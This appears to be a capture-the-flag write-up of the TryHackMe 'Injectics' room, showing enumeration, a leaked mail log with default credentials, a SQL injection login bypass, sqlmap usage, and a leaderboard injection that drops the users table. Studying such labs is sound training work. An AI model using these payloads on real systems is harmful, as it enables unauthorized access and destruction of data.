# Injectics

{% embed url="https://tryhackme.com/room/injectics" %}

### Initial enumeration

#### Basic fuzzing:

{% code overflow="wrap" %}
```bash
$ gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
{% endcode %}

...

Interesting files: `composer.lock`, **`composer.json`**

From `composer.lock`, I found out that the application uses Twig.

#### Source code review

... found file `mail.log`&#x20;

```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```

From this note, we can understand that ...

### Exploring the application

#### (1) Normal user login

```http
POST /functions.php HTTP/1.1

Host: ...
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://...
Connection: keep-alive
Referer: http://10.10.244.88/login.php?mail=t&pass=t
Cookie: PHPSESSID=oqttvasr6crs86ila4mi3kbjf6
Priority: u=0

username=1&password=1&function=login
```

**Possible SQL query:**

```sql
SELECT * FROM table WHERE username = x AND password = x 
```

Injection to `username` POST field:

```sql
'||1=1;-- //there is an explicit space right after the comment (--)
```



* This works with space in between the items too:&#x20;

```
' || 1=1;-- 
```

`' || 1=1; --`&#x20;

```sql
SELECT * FROM table WHERE username = ''||1=1'-- AND password = '1' 
```

**Further learning**

* To explore what other injection methods can be used, I utilized Sqlmap:&#x20;

> `login.txt` contains the HTTP POST request from above

```sh
$ sqlmap -r login.txt --risk=3 --level=5
' RLIKE SLEEP(3) -- n 
```

#### (2) Edit leaderboard

After the successful injection on the login form, we are able to view the dashboard page, which presents us with a method to edit the leader board table:

```http
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.244.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.175.148
Connection: keep-alive
Referer: http://10.10.175.148/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=4rtpdvbsmkvqquno4am9ij5h6q
Upgrade-Insecure-Requests: 1
Priority: u=0, i

rank=1&country=1&gold=1&silver=1&bronze=1
```

**Possible SQL query:**

```sql
UPDATE table SET gold = x, silver = x, bronze = x WHERE rank = x;
```

**ATTEMPT 1**

Injection to the `gold` field:

```sql
22, silver = 22, bronze = 22;-- // explicit space after comment
```

```sql
UPDATE table SET gold = 22, silver = 22, bronze = 22;--, silver = x, bronze = x WHERE id = 'x';; 
```

* This action will update the `gold`, `silver` and `bronze` field to **22** for every country. With that, we know that the SQL injection worked!

**ATTEMPT 2**

```sql
1 WHERE 1=1; DROP TABLE users;-- 
```

{% code overflow="wrap" %}
```sql
UPDATE table SET gold = 1 WHERE 1=1; DROP TABLE users;-- , bronze = x WHERE id = x;, silver = x, bronze = x WHERE id = x;

```
{% endcode %}

**Further learning**

Sqlmap:&#x20;

```
$ sqlmap -r leaderboard.txt -p gold,silver,bronze --dbms=mysql 
```

